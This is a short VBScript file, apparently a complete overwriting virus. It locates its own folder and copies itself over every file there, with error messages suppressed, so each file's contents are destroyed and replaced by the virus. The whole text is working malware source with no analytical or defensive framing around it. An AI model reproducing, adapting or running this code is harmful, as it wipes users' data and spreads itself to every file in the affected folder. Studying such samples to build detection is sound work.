Dim SmaLL, WshShell, FSO, VX
On Error Resume Next
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = Wscript.CreateObject("Wscript.Shell")
SmaLL = Wscript.ScriptFullName
VX = Left(SmaLL, InStrRev(SmaLL, "\"))
For Each target in FSO.GetFolder(VX).Files
  FSO.CopyFile SmaLL, target.Name, 1
Next